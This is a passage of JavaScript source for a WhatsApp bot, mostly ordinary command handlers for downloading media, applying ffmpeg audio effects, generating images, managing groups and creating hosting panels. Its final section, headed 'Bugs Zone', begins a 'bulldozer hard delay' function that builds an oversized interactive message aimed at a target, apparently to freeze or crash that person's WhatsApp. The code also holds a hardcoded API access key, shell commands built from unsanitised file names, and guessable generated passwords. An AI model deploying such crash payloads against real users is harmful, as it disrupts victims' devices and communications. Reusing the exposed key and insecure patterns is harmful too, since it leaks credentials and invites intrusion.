      const thumbnail = await (await fetch(imageUrl)).buffer();
     await ReplyMultiMenu2(`wise Al is downloading song ${title} by author`);    
      await bot.sendMessage(m.chat, {
        audio: { url: downloadUrl },
        mimetype: 'audio/mpeg',
        fileName: `${title}.mp3`,
        ptt: true,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title,
            body: `${channel} • ${duration}`,
            thumbnail,
            mediaUrl: link,
            mediaType: 2,
            renderLargerThumbnail: true,
            sourceUrl: link
          }
        }
      }, { quoted: m });
    } catch (err) {
      console.warn('Fallback to Diioffc API:', err.message);
      try {
        const res2 = await fetch(`https://api.diioffc.web.id/api/search/ytplay?query=${encodeURIComponent(text)}`);
        if (!res2.ok) return ReplyMultiMenu2('unable to get song data.');
        const json = await res2.json();
        if (!json.status || !json.result) return ReplyMultiMenu2('title must be valid!');
        const { title, author, duration, thumbnail: thumb, url, download } = json.result;
        const thumbnail = await (await fetch(thumb)).buffer();

        await bot.sendMessage(m.chat, {
          audio: { url: download.url },
          mimetype: 'audio/mpeg',
          fileName: download.filename || `${title}.mp3`,
          ptt: true,
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
              title,
              body: `${author.name} • ${duration.timestamp}`,
              thumbnail,
              mediaUrl: url,
              mediaType: 2,
              renderLargerThumbnail: true,
              sourceUrl: url
            }
          }
        }, { quoted: m });
      } catch (finalErr) {
        console.error(finalErr);
        ReplyMultiMenu2('an error has occurred while processing your request.');
      }
    }
  }
}
break
//==================================================//     
        case "play":{
                if (!text) return ReplyMultiMenu2(`\n*ex:* ${prefix + command} impossible\n`)
           
    let res = await fetch(`https://ochinpo-helper.hf.space/yt?query=${encodeURIComponent(text)}`);
    if (!res.ok) throw new Error('API not found');
  let json = await res.json();
    if (!json.success || !json.result) throw new Error('an api error occured');         
  const {
      title,
      url,
      image,
      duration,
      author,
      download
    } = json.result;            
               await ReplyMultiMenu2(`Wise-Al is downloading song ${title}`);
                let mbut = await fetchJson(`https://ochinpo-helper.hf.space/yt?query=${text}`)
                let ahh = mbut.result
                let crot = ahh.download.audio

                bot.sendMessage(m.chat, {
                    audio: { url: crot },
                    mimetype: "audio/mpeg", 
                    ptt: true
                }, { quoted: loli })
            }
            break
//==================================================//             
               case "texttoimage": case "flux": case "fluximg": case "createimage": case "bikin gambar": case "timg": {
  if (!text) {
    return ReplyMultiMenu2('provide a query!');
  }
  try {
    ReplyMultiMenu2('_sending request ..._');
    let apiUrl = `https://api.rynn-archive.biz.id/ai/flux-schnell?text=${encodeURIComponent(text)}`;
    let response = await fetch(apiUrl);
    let buffer = await response.buffer();
    await bot.sendMessage(m.chat, { image: buffer, caption: '*Here is your image' }, { quoted: m });
  } catch (error) {
    console.error('Error in flux:', error);
    ReplyMultiMenu2('failed to create image');
  }
}
break
//==================================================//           
        case 'join': { 
                 if (!Owner) return ReplyMultiMenu2(mess.ownee)
                 if (!text) return ReplyMultiMenu2("provide a valid group link") 
                 let result = args[0].split('https://chat.whatsapp.com/')[1] 
                 await bot.groupAcceptInvite(result).then((res) =>  ReplyMultiMenu2(jsonformat(res))).catch((err) =>ReplyMultiMenu2(`Link has problem.`)) 
  
             }  
               break;
        
//==================================================//              
        case "toimage": {
if (!/webp/.test(mime) && !/audio/.test(mime)) return ReplyMultiMenu2('reply sticker')
ReplyMultiMenu2('wait....')
let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = `${makeid}.png`
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
bot.sendMessage(m.chat, {image: buffer}, {
quoted: m})
fs.unlinkSync(ran)
})
}
break
//==================================================//                 
        case 'listblock':{
let block = await bot.fetchBlocklist()
ReplyMultiMenu2('List Block :\n\n' + `Total : ${block == undefined ? '*0* Blocked Contacts' : '*' + block.length + '* Blocked Contacts'}\n` + block.map(v => '• ' + v.replace(/@.+/, '')).join`\n`)
}
break
//==================================================//             
        case 'pairban':
case 'pair': {
    const allowedUsers = ['254107065646@s.whatsapp.net', '254106208580@s.whatsapp.net']; // add your allowed WhatsApp IDs here
    if (!allowedUsers.includes(m.sender)) return reply("_Only authorized users can use this command._");

    if (!q) return ReplyMultiMenu2(`Example:\n ${prefix + command} 254###`);

    let victim = text.split("|")[0];
    let Xreturn = m.mentionedJid?.[0] || m.quoted?.sender || victim.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const contactInfo = await bot.onWhatsApp(Xreturn);
    if (!contactInfo || contactInfo.length === 0) {
        return ReplyMultiMenu2("The number is not registered on WhatsApp");
    }

    await ReplyMultiMenu2("*processing.....*");

    const numberOnly = victim.replace(/[^0-9]/g, '');
    const countryCode = numberOnly.slice(0, 3);
    const prefixxx = numberOnly.slice(0, 1);
    const firstTwoDigits = numberOnly.slice(0, 2);

    const isValidWhatsAppNumber = (number) => {
        return number.length >= 10 && number.length <= 15 && !isNaN(number);
    };

    if (countryCode === "252" || prefixxx === "0" || firstTwoDigits === "89" || countryCode.startsWith("85")) {
        return ReplyMultiMenu2("Sorry, numbers with country code 252, prefix 0, starting with 89, or +85 are not supported for using the bot.");
    }

    if (!isValidWhatsAppNumber(numberOnly)) {
        return ReplyMultiMenu2("Invalid WhatsApp number. Please enter a valid number.");
    }

    const startpairing = require('./connect.js');
    await startpairing(Xreturn);
    await sleep(4000);

    const fs = require('fs');
    const cu = fs.readFileSync('./list/pairing.json', 'utf-8');
    const cuObj = JSON.parse(cu);
    await sleep(2000);

    await bot.sendMessage(Xreturn, {
        image: { url: "https://files.catbox.moe/ne5wcc.png" },
        caption: `━━━━━━━━━━━━\n* Success Pairing\n* ACTIVATOR 🥳\n* Link that code\n* Welcome to the ACTIVATOR Community \n━━━━━━━━━━━━`
    }, { quoted: m });

    await sleep(4500);

    await bot.sendMessage(Xreturn, {
        text: `${cuObj.code}`
    }, { quoted: m });

    break;
}
//==================================================//              
        case 'delpair': {

const allowedUsers = ['254107065646@s.whatsapp.net', '254106208580@s.whatsapp.net']; // By яαgємσ∂ѕ

    if (!allowedUsers.includes(m.sender)) return ReplyMultiMenu2("❌ You don't have permission to use this command.");

    if (!q) return ReplyMultiMenu2(`Example:\n ${prefix + command} 254...`);

    let victim = text.split("|")[0];
    let Xreturn = m.mentionedJid?.[0] || m.quoted?.sender || victim.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    if (!Xreturn) {
        return ReplyMultiMenu2("The number is not registered on WhatsApp");
    }

    const pairingPath = './list/lib/pairing';
    const targetPath = `${pairingPath}/${Xreturn}`;

    try {
        if (!fs.existsSync(targetPath)) {
            return ReplyMultiMenu2(`Paired device with ID "${Xreturn}" does not exist.`);
        }

        fs.rmSync(targetPath, { recursive: true, force: true });
        ReplyMultiMenu2(`Paired device with ID "${Xreturn}" has been successfully deleted.`);
    } catch (err) {
        console.error('Error deleting paired device:', err);
        return ReplyMultiMenu2('An error occurred while attempting to delete the paired device.');
    }
}
break;
//==================================================//               
        case 'active-paired': {


    const pairingPath = './lib2/pairing';

    try {
        if (!fs.existsSync(pairingPath)) {
            return ReplyMultiMenu2('No paired devices found.');
        }

        const entries = fs.readdirSync(pairingPath, { withFileTypes: true });

        const pairedDevices = entries
            .filter(entry => entry.isDirectory())
            .map(entry => entry.name.replace('@s.whatsapp.net', ''));

        if (pairedDevices.length === 0) {
            return ReplyMultiMenu2('No paired devices found.');
        }

        const totalUsers = pairedDevices.length;
        const deviceList = pairedDevices
            .map((device, index) => `${index + 1}. ${device}`)
            .join('\n');

        ReplyMultiMenu2(`Total Rent Bot Users: ${totalUsers}\n\nPaired Devices:\n${deviceList}`);
    } catch (err) {
        console.error('Error reading paired devices directory:', err);
        return ReplyMultiMenu2('Failed to load paired devices data.');
    }
}
break;
//==================================================//              
        case 'clearchat': {
let pee = "\n".repeat(200)
ReplyMultiMenu2(pee + '😁🖕')
}
break
//==================================================//            
        case "toptv": {
if (/video/.test(qmsg.mimetype)) {
if ((qmsg).seconds > 30) return ReplyMultiMenu2("maximum video duration 30 seconds!")
let ptv = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({ ptvMessage: qmsg }), { userJid: m.chat, quoted: m })
bot.relayMessage(m.chat, ptv.message, { messageId: ptv.key.id })
} else { 
return ReplyMultiMenu2("reply to video")
}
}
break
//==================================================//      
        case 'tiktok': case "tt": { 
             
    if (!text) return ReplyMultiMenu2(`Example : ${prefix + command} link`);
    if (!text.includes('tiktok')) return m.ReplyMultiMenu2(`Link Invalid!!`);
    ReplyMultiMenu2("Please Wait..");
    
    // Menggunakan fetch untuk akses API TikTok milikmu
    fetch(`https://api.tiklydown.eu.org/api/download/v5?url=${encodeURIComponent(text)}`)
        .then(response => response.json())
        .then(data => {
            if (data.status !== 200) return m.reply('Api error');
            
            // Mengambil URL video dan audio
        const title = `*Successfully*`
            const videoUrl = data.result.play;
            const audioUrl = data.result.music;
            
            // Mengirim video dan audio
            bot.sendMessage(m.chat, { caption: title, video: { url: videoUrl }}, { quoted: m });
            bot.sendMessage(m.chat, { audio: { url: audioUrl }, mimetype: 'audio/mp4' }, { quoted: null });
        })
        .catch(err => reply(err.toString()));
}
break;
//==================================================//           
        case "yts": {
if (!text) return ReplyMultiMenu2("Example:Dj Tiktok")
await ReplyMultiMenu2(msg.wait)
await yts(text).then(async (data) => {
if (data.all.length == 0) return m.ReplyMultiMenu2(mess.error)
let teks = '\n*🔎Your Search*\n\n'
for (let i of data.all) {
teks += `*◦ Title :* ${i.title}
*◦ Channel :* ${i.author?.name || "unknown"}
*◦ Duration :* ${i?.timestamp || "unknown"}
*◦ Link Url :* ${i.url}\n\n`
}
ReplyMultiMenu2(teks)
}).catch(err => m.reply(err.toString()))
}
break
//==================================================//           
        case 'fb': case 'facebook': case 'fbdl':
case 'ig': case 'instagram': case 'igdl': {
 if (!args[0]) return ReplyMultiMenu2("🔗 provide a fb or ig link!");
 try {
 const axios = require('axios');
 const cheerio = require('cheerio');
 async function yt5sIo(url) {
 try {
 const form = new URLSearchParams();
 form.append("q", url);
 form.append("vt", "home");
 const { data } = await axios.post('https://yt5s.io/api/ajaxSearch', form, {
 headers: {
 "Accept": "application/json",
 "X-Requested-With": "XMLHttpRequest",
 "Content-Type": "application/x-www-form-urlencoded",
 },
 });
 if (data.status !== "ok") throw new Error("provide a valid link.");
 const $ = cheerio.load(data.data); 
 if (/^(https?:\/\/)?(www\.)?(facebook\.com|fb\.watch)\/.+/i.test(url)) {
 const thumb = $('img').attr("src");
 let links = [];
 $('table tbody tr').each((_, el) => {
 const quality = $(el).find('.video-quality').text().trim();
 const link = $(el).find('a.download-link-fb').attr("href");
 if (quality && link) links.push({ quality, link });
 });
 if (links.length > 0) {
 return { platform: "facebook", type: "video", thumb, media: links[0].link };
 } else if (thumb) {
 return { platform: "facebook", type: "image", media: thumb };
 } else {
 throw new Error("media is invalid.");
 }
 } else if (/^(https?:\/\/)?(www\.)?(instagram\.com\/(p|reel)\/).+/i.test(url)) {
 const video = $('a[title="Download Video"]').attr("href");
 const image = $('img').attr("src");
 if (video) {
 return { platform: "instagram", type: "video", media: video };
 } else if (image) {
 return { platform: "instagram", type: "image", media: image };
 } else {
 throw new Error("Media invalid.");
 }
 } else {
 throw new Error("provide a valid url or link.");
 }
 } catch (error) {
 return { error: error.message };
 }
 }
 await bot.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 let res = await yt5sIo(args[0]);
 if (res.error) {
 await bot.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 return ReplyMultiMenu2(`⚠ *Error:* ${res.error}`);
 }
 if (res.type === "video") {
 await bot.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await bot.sendMessage(m.chat, { video: { url: res.media }, caption: "✅ *Downloaded by ACTIVATOR!*" }, { quoted: m });
 } else if (res.type === "image") {
 await bot.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await bot.sendMessage(m.chat, { image: { url: res.media }, caption: "✅ *Downloaded photo by ACTIVATOR!*" }, { quoted: m });
 }
 } catch (error) {
 console.error(error);
 await bot.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 ReplyMultiMenu2("failed to get media.");
 }
}
break   
//==================================================//             
        case "setppbot": case "setpp": {
if (!Owner) return ReplyMultiMenu2(mess.owner)
if (/image/g.test(mime)) {
let media = await bot.downloadAndSaveMediaMessage(qmsg)
await bot.updateProfilePicture(botNumber, {url: media})
await fs.unlinkSync(media)
ReplyMultiMenu2("Success update bot pic ✅")
} else return ReplyMultiMenu2("reply a photo")}
break
//==================================================//     
        case 'lyrics': {
  if (!q) return ReplyMultiMenu2('Example: lyrics <keyword>,<amount>\n\nExample: lyrics duka,3')
  let [keyword, jumlah] = q.split(',').map(v => v.trim())
  if (!keyword) return ReplyMultiMenu2('provide a valid key word')
  jumlah = parseInt(jumlah) || 3

  try {
    let res = await fetch(`https://apikey.sazxofficial.web.id/api/search/lyrics?q=${encodeURIComponent(keyword)}`)
    let data = await res.json()
    if (!data.status || !data.result || data.result.length === 0) {
      return ReplyMultiMenu2('Lyrics not found.')
    }
    let hasil = data.result.slice(0, jumlah).map((item, i) => {
      return `*${i + 1}. ${item.title}* - _${item.artist}_\n\n${item.lyricSingkat.trim()}\n`
    }).join('\n────────────\n\n')
    m.reply(`*Downloaded Lyrics: ${keyword}*\n\n${hasil}`)
  } catch (e) {
    console.error(e)
    ReplyMultiMenu2('an error has occurred while fetching lyrics.')
  }
}
  break
//==================================================//            
         case 'bass':
 try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/audio/.test(mime)) {
ReplyMultiMenu2("process.....")
let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return ReplyMultiMenu2(err)
let buff = fs.readFileSync(ran)
bot.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else ReplyMultiMenu2MultiMenu2(`ReplyMultiMenu2 audio with caption *${prefix + command}*`)
} catch (e) {
ReplyMultiMenu2(e)
}
break
//==================================================//    
        case 'blown':
 try {
let set
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/audio/.test(mime)) {
ReplyMultiMenu2("process.....")
let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return ReplyMultiMenu2(err)
let buff = fs.readFileSync(ran)
bot.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else ReplyMultiMenu2(`ReplyMultiMenu2 audio with caption *${prefix + command}*`)
} catch (e) {
ReplyMultiMenu2(e)
}
break
//==================================================//            
        case 'deep':
 try {
let set
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/audio/.test(mime)) {
ReplyMultiMenu2("process.....")
let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return ReplyMultiMenu2(err)
let buff = fs.readFileSync(ran)
bot.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else ReplyMultiMenu2(`reply audio with caption *${prefix + command}*`)
} catch (e) {
reply(e)
}
break
//==================================================//            
        case 'earrape':
 try {
let set
if (/earrape/.test(command)) set = '-af volume=12'
if (/audio/.test(mime)) {
ReplyMultiMenu2("process.....")
let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return ReplyMultiMenu2(err)
let buff = fs.readFileSync(ran)
bot.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else ReplyMultiMenu2(`reply audio with caption *${prefix + command}*`)
} catch (e) {
ReplyMultiMenu2(e)
}
break
//==================================================//            
        case 'fast':
 try {
let set
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/audio/.test(mime)) {
ReplyMultiMenu2("process.....")
let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return ReplyMultiMenu2(err)
let buff = fs.readFileSync(ran)
bot.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else ReplyMultiMenu2(`reply audio with caption *${prefix + command}*`)
} catch (e) {
ReplyMultiMenu2(e)
}
break
//==================================================//            
        case 'fat':
 try {
let set
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/audio/.test(mime)) {
ReplyMultiMenu2("process.....")
let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return ReplyMultiMenu2(err)
let buff = fs.readFileSync(ran)
bot.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else ReplyMultiMenu2(`reply audio with caption *${prefix + command}*`)
} catch (e) {
ReplyMultiMenu2(e)
}
break
//==================================================//            
        case 'nightcore':
 try {
let set
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/audio/.test(mime)) {
ReplyMultiMenu2("process.....")
let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return ReplyMultiMenu2(err)
let buff = fs.readFileSync(ran)
bot.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else ReplyMultiMenu2(`reply audio with caption *${prefix + command}*`)
} catch (e) {
ReplyMultiMenu2(e)
}
break
//==================================================//            
        case 'robot':
 try {
let set
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/audio/.test(mime)) {
ReplyMultiMenu2("process.....")
let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return ReplyMultiMenu2(err)
let buff = fs.readFileSync(ran)
bot.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else ReplyMultiMenu2(`reply audio with caption *${prefix + command}*`)
} catch (e) {
reply(e)
}
break
//==================================================//            
        case 'slow':
 try {
let set
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/audio/.test(mime)) {
ReplyMultiMenu2("process.....")
let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
bot.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else ReplyMultiMenu2(`reply audio with caption *${prefix + command}*`)
} catch (e) {
ReplyMultiMenu2(e)
}
break
//==================================================//            
        case 'smooth':
 try {
let set
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/audio/.test(mime)) {
ReplyMultiMenu2("process.....")
let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return ReplyMultiMenu2(err)
let buff = fs.readFileSync(ran)
bot.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else ReplyMultiMenu2(`reply audio with caption *${prefix + command}*`)
} catch (e) {
reply(e)
}
break
//==================================================//    
case 'chatgpt': {
    if (!text) return ReplyMultiMenu2(`Example: ${prefix + command} what is a bot?`);
    const model_list = {
        chatgpt4: {
            api: 'https://stablediffusion.fr/gpt4/predict2',
            referer: 'https://stablediffusion.fr/chatgpt4'
        },
        chatgpt3: {
            api: 'https://stablediffusion.fr/gpt3/predict',
            referer: 'https://stablediffusion.fr/chatgpt3'
        }
    };

    try {
        let results = [];
        for (const [model, config] of Object.entries(model_list)) {
            try {
const axios = require('axios');
                const hmm = await axios.get(config.referer);
                const { data } = await axios.post(config.api, {
                    prompt: text
                }, {
                    headers: {
                        accept: '*/*',
                        'content-type': 'application/json',
                        origin: 'https://stablediffusion.fr',
                        referer: config.referer,
                        cookie: hmm.headers['set-cookie'].join('; '),
                        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36'
                    }
                });
                results.push(`*${model.toUpperCase()}*:\n${data.message || 'invalid query.'}`);
            } catch (err) {
                results.push(`*${model.toUpperCase()}*:\nHere are the results.`);
                console.error(`Error on ${model}:`, err.message);
            }
        }
        ReplyMultiMenu2(results.join('\n\n'));
    } catch (e) {
        console.error(e);
        ReplyMultiMenu2('an error has occurred.');
    }
}
break
//==================================================//            
        case "revoke": 
 case "newlink": 
 case "reset": { 
   if (!m.isGroup) return ReplyMultiMenu2(mess.group); // add "new Error" to create a new Error object 
   if (!isAdmins) return ReplyMultiMenu2 ("bot must be admin first"); // add "new Error" to create a new Error object 
   if (!isBotAdmins) return ReplyMultiMenu2(mess.admin); // add "new Error" to create a new Error object 
   await bot.groupRevokeInvite(m.chat); 
   await bot.sendText(m.chat, 'Group link revoked!', m); // use "client.sendText" instead of "m.reply" to ensure message is sent 
   let response = await bot.groupInviteCode(m.chat); 
 bot.sendText(m.sender, `https://chat.whatsapp.com/${response}\n\nHere is the new group link for ${groupMetadata.subject}`, m, { detectLink: true }); 
 bot.sendText(m.chat, `Sent you the new group link in your inbox!`, m); 
   // use "client.sendTextWithMentions" instead of "client.sendText" to include group name in message 
 }          
  break;

//==================================================//    
        case 'arting': {
    if (!text) return ReplyMultiMenu2('Provide text! Example: .arting girl wearing glasses');
    await bot.sendMessage(m.chat, { react: { text: '✨', key: m.key }});
    
    try {
        await bot.sendMessage(m.chat, { image: { url: `https://api.nekorinn.my.id/ai-img/arting?text=${text}` }}, { quoted: m });
    } catch (err) {
        console.log(err.message);
        bot.sendMessage(m.chat, { react: { text: '❌', key: m.key }});
        ReplyMultiMenu2('failed to create image!');
    }
}
break;
//==================================================//          
case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": 
case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": 
case "unlimited": case "unli": {
  const func = require('./list/lib/utils.js') 
    if (!Owner) {
        return ReplyMultiMenu2(mess.owner);
    }
    if (!text) return ReplyMultiMenu2("username,254XXX");

    let nomor, usernem;
    let tek = text.split(",");
    if (tek.length > 1) {
        let [users, nom] = tek.map(t => t.trim());
        if (!users || !nom) return ReplyMultiMenu2("username,254XXX");
        nomor = nom.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        usernem = users.toLowerCase();
    } else {
        usernem = text.toLowerCase();
        nomor = m.isGroup ? m.sender : m.chat
    }

    try {
        var onWa = await bot.onWhatsApp(nomor.split("@")[0]);
        if (onWa.length < 1) return ReplyMultiMenu2("Number must be registered on WhatsApp!");
    } catch (err) {
        return ReplyMultiMenu2("failed to get number on whatsapp: " + err.message);
    }

    // Mapping RAM, Disk, dan CPU
    const resourceMap = {
        "1gb": { ram: "1000", disk: "1000", cpu: "40" },
        "2gb": { ram: "2000", disk: "1000", cpu: "60" },
        "3gb": { ram: "3000", disk: "2000", cpu: "80" },
        "4gb": { ram: "4000", disk: "2000", cpu: "100" },
        "5gb": { ram: "5000", disk: "3000", cpu: "120" },
        "6gb": { ram: "6000", disk: "3000", cpu: "140" },
        "7gb": { ram: "7000", disk: "4000", cpu: "160" },
        "8gb": { ram: "8000", disk: "4000", cpu: "180" },
        "9gb": { ram: "9000", disk: "5000", cpu: "200" },
        "10gb": { ram: "10000", disk: "5000", cpu: "220" },
        "unlimited": { ram: "0", disk: "0", cpu: "0" }
    };
    
    let { ram, disk, cpu } = resourceMap[command] || { ram: "0", disk: "0", cpu: "0" };

    let username = usernem.toLowerCase();
    let email = username + "@gmail.com";
    let name = username + " Server";
    let password = username + "001";

    try {
        let f = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: { "Accept": "application/json", "Content-Type": "application/json", "Authorization": "Bearer " + apikey },
            body: JSON.stringify({ email, username, first_name: name, last_name: "Server", language: "en", password })
        });
        let data = await f.json();
        if (data.errors) return ReplyMultiMenu2("Error: " + JSON.stringify(data.errors[0], null, 2));
        let user = data.attributes;

        let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
            method: "GET",
            headers: { "Accept": "application/json", "Content-Type": "application/json", "Authorization": "Bearer " + apikey }
        });
        let data2 = await f1.json();
        let startup_cmd = data2.attributes.startup;
       
        let f2 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: { "Accept": "application/json", "Content-Type": "application/json", "Authorization": "Bearer " + apikey },
            body: JSON.stringify({
                name,
               
                user: user.id,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_23",
                startup: startup_cmd,
                environment: { INST: "npm", USER_UPLOAD: "0", AUTO_UPDATE: "0", CMD_RUN: "npm start" },
                limits: { memory: ram, swap: 0, disk, io: 500, cpu },
                feature_limits: { databases: 5, backups: 5, allocations: 5 },
                deploy: { locations: [parseInt(loc)], dedicated_ip: false, port_range: [] },
            })
        });
        let result = await f2.json();
        if (result.errors) return ReplyMultiMenu2("Error: " + JSON.stringify(result.errors[0], null, 2));
        
        let server = result.attributes;
        var orang = nomor
        if (m.isGroup) {
        await ReplyMultiMenu2(`Success ✅\ndata server is send to ${nomor == m.sender ? "private chat" : nomor.split("@")[0]}`)
        }        
        if (nomor !== m.sender && !m.isGroup) {
        await ReplyMultiMenu2(`Success created panel ✅\ndata for panels are down here ${nomor.split("@")[0]}`)
        }
        
        let teks = `
*panel successfully created📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}


*🌐 Specification Server*
* Ram : *${ram == "0" ? "Unlimited" : ram / 1000 + "GB"}*
* Disk : *${disk == "0" ? "Unlimited" : disk / 1000 + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu + "%"}*
* ${global.domain}

*Rules & Regulations:*
* panel expires in one week
* Don't share panel details 
* Gaurantee 15 days(1x replace)
* Claim uarantee once panel is down
`;

        await bot.sendMessage(orang, { text: teks }, { quoted: m });
    } catch (err) {
        return reply("an error occurred: " + err.message);
    }
}
break






//==================================================//       
    case "lookup": {
//inireact();
if (!q) return ReplyMultiMenu2(`Example: ${m.prefix + m.command} 254XXXX`);
try {
var response = await fetch(`http://apilayer.net/api/validate?access_key=4a1ede76e87d9e64682b284e8620ad68&number=+${q}&country_code=&format=1`);
var result = await response.json();
ReplyMultiMenu2(JSON.stringify(result, null, 2));
} catch (error) {
ReplyMultiMenu2(`Error: ${error.message}`);
}
}
break    
                            
//==================================================//        
  case "getname": {
if (q) {
try {
var name = d4tbs.users[q].name
} catch {
var name = await bot.getName(q)
}
ReplyMultiMenu2(name)
} else {
ReplyMultiMenu2(m.pushName)
}
}
break      
//==================================================//
case 'addprem': {
if (!Owner) return ReplyMultiMenu2(mess.owner)
if (args.length < 2)
return ReplyMultiMenu2(`Use :\n*#addprem* @tag days\n*#addprem* number days\n\nContoh : #addprem @tag 30d`);
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
addPremiumUser(m.mentionedJid[0], args[1], orgkaya);
}
ReplyMultiMenu2("Sukses Premium")
} else {
addPremiumUser(args[0] + "@s.whatsapp.net", args[1], orgkaya);
ReplyMultiMenu2("Sukses Via Number")
await sleep(2000)
bot.sendMessage(args[0] + "@s.whatsapp.net", {image: {url: `https://i.ibb.co/39rrkttP/455944eb4d07a365.jpg`}, caption: `success added prem user`},{quoted: mdmodes })
}
}
break
        
        //Bugs Zone//
//==================================================// 
        //(Function bulldozer hard delay)//   
  async function Cursor(client, target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "🌹 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃" + " ".repeat(10000)
          },
          footer: {
            text: ""
          },
          carouselMessage: {
            cards: [
              {
                header: {
                  title: "🌹 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃",
                  imageMessage: {
                    mimetype: "image/jpeg",
